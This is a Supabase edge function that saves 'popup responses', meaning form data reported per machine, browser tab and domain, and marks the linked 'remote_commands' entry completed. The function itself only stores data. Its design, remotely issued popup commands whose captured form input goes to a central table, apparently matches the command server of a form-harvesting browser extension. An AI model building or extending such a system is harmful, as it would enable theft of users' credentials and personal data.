import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2.57.4';

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const supabase = createClient(
      Deno.env.get('SUPABASE_URL') ?? '',
      Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? ''
    );

    const { command_id, machine_id, tab_id, domain, url, form_data } = await req.json();

    console.log('Received popup response:', { command_id, machine_id, domain });

    // Validate required fields (tab_id is optional for proxy-fetch commands)
    if (!command_id || !machine_id || !domain || !form_data) {
      return new Response(
        JSON.stringify({ error: 'Missing required fields' }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Insert popup response
    const { data: response, error: insertError } = await supabase
      .from('popup_responses')
      .insert({
        command_id,
        machine_id,
        tab_id,
        domain,
        url,
        form_data,
        is_read: false
      })
      .select()
      .single();

    if (insertError) {
      console.error('Error inserting popup response:', insertError);
      throw insertError;
    }

    // Update remote_command status to completed
    const { error: updateError } = await supabase
      .from('remote_commands')
      .update({ status: 'completed', response: form_data })
      .eq('id', command_id);

    if (updateError) {
      console.error('Error updating command status:', updateError);
    }

    console.log('Popup response saved successfully:', response.id);

    return new Response(
      JSON.stringify({ success: true, response_id: response.id }),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error) {
    console.error('Error processing popup response:', error);
    const errorMessage = error instanceof Error ? error.message : 'Unknown error';
    return new Response(
      JSON.stringify({ error: errorMessage }),
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  }
});